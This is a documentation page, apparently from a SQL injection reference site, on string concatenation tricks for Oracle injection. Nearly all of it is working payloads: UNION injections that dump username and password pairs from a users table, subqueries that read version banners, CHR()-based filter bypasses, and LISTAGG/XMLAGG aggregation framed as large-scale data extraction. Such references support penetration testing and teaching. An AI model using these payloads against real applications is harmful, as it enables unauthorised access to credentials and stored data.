---
title: String Concatenation
description: Techniques for concatenating strings in Oracle SQL injection
category: Injection Techniques
order: 9
tags: ["concatenation", "string manipulation", "injection"]
lastUpdated: 2025-03-15
---

## String Concatenation

String concatenation plays a crucial role in crafting complex SQL injection payloads in Oracle databases. Understanding the various concatenation methods can help bypass filters and construct dynamic queries.

### Basic String Concatenation

Oracle provides multiple ways to concatenate strings:

| Method | Description | Example | Result |
|--------|-------------|---------|--------|
| Double pipe `\|\|` | Standard SQL concatenation operator | `'ABC' \|\| 'DEF'` | `ABCDEF` |
| `CONCAT()` function | Two-argument concatenation function | `CONCAT('ABC', 'DEF')` | `ABCDEF` |
| `CONCAT_WS()` function | Concatenation with separator (12c+) | `CONCAT_WS(',', 'A', 'B', 'C')` | `A,B,C` |
| `XMLCONCAT()` | XML-based concatenation | `XMLCONCAT(XMLELEMENT(E, 'A'), XMLELEMENT(E, 'B')).GETCLOBVAL()` | Complex XML result |

### Using Double Pipe Operator

The double pipe (`||`) is the most common concatenation method in Oracle:

```sql
-- Simple concatenation
SELECT 'Hello' || ' ' || 'World' FROM dual

-- Concatenating with columns
SELECT first_name || ' ' || last_name AS full_name FROM employees

-- Concatenating with functions
SELECT 'User: ' || SYS_CONTEXT('USERENV', 'SESSION_USER') FROM dual
```

### SQL Injection Examples

#### Basic Concatenation Injection

```sql
-- Breaking out of quoted string
' || 'injected

-- Completing a valid expression
' || (SELECT password FROM users WHERE username='admin') || '

-- Injecting subqueries
' || (SELECT banner FROM v$version WHERE rownum=1) || '
```

#### UNION Attack with Concatenation

```sql
-- UNION with concatenated columns
' UNION SELECT username || ':' || password, NULL FROM users--

-- UNION with concatenated results
' UNION SELECT 'Found: ' || LISTAGG(username, ',') WITHIN GROUP (ORDER BY username), NULL FROM users--
```

### Advanced Concatenation Techniques

#### Using CONCAT Function

The CONCAT function can be useful when the `||` operator is filtered:

```sql
-- Basic CONCAT usage
' UNION SELECT CONCAT('User: ', username), NULL FROM users--

-- Nested CONCAT
' UNION SELECT CONCAT(CONCAT('ID:', user_id), CONCAT(':', password)), NULL FROM users--
```

#### Using XMLAGG for Row Concatenation

XMLAGG is powerful for concatenating values across multiple rows:

```sql
-- Concatenate all usernames into one row
' UNION SELECT XMLAGG(XMLELEMENT(E, username || ',')).EXTRACT('//text()').GETCLOBVAL(), NULL FROM users--

-- With ordering
' UNION SELECT XMLAGG(XMLELEMENT(E, username || ',') ORDER BY username).EXTRACT('//text()').GETCLOBVAL(), NULL FROM users--
```

#### Using LISTAGG for Row Concatenation (11g+)

```sql
-- Basic LISTAGG
' UNION SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username), NULL FROM users--

-- LISTAGG with conditions
' UNION SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username) || ' (Total: ' || COUNT(*) || ')', NULL FROM users WHERE username LIKE 'A%'--
```

### Bypassing Filters

#### Bypassing Concatenation Filters

When `||` or CONCAT is filtered:

```sql
-- Using CHR() with concatenation
' UNION SELECT CHR(65)||CHR(66)||CHR(67), NULL FROM dual--  -- 'ABC'

-- Using REPLACE as concatenation
' UNION SELECT REPLACE('XYZ', 'X', 'A')||REPLACE('XYZ', 'X', 'B'), NULL FROM dual--
```

#### Using TO_CHAR for Concatenation

```sql
-- Converting non-string data for concatenation
' UNION SELECT 'ID:' || TO_CHAR(employee_id), NULL FROM employees--

-- Date formatting with concatenation
' UNION SELECT 'Date: ' || TO_CHAR(SYSDATE, 'YYYY-MM-DD HH24:MI:SS'), NULL FROM dual--
```

### Handling Special Characters

```sql
-- Escaping quotes
' UNION SELECT 'Isn''t this interesting?', NULL FROM dual--

-- Using CHR() for special characters
' UNION SELECT 'Quote: ' || CHR(39) || ' Backslash: ' || CHR(92), NULL FROM dual--
```

### Multi-row Output Formatting

```sql
-- Formatting multi-row outputs
' UNION SELECT RPAD(username, 20) || ' | ' || password, NULL FROM users--

-- Creating table-like output
' UNION SELECT 'ID: ' || TO_CHAR(ROWNUM) || CHR(10) || 'User: ' || username || CHR(10) || 'Email: ' || email, NULL FROM users--
```

### Working with NULLs

```sql
-- Handling NULLs in concatenation
' UNION SELECT NVL(username, 'Anonymous') || ':' || NVL(email, 'No Email'), NULL FROM users--
```

### Performance Considerations

For large-scale data extraction:

```sql
-- Limiting concatenated output size
' UNION SELECT SUBSTR(LISTAGG(username, ',') WITHIN GROUP (ORDER BY username), 1, 1000), NULL FROM users--
```

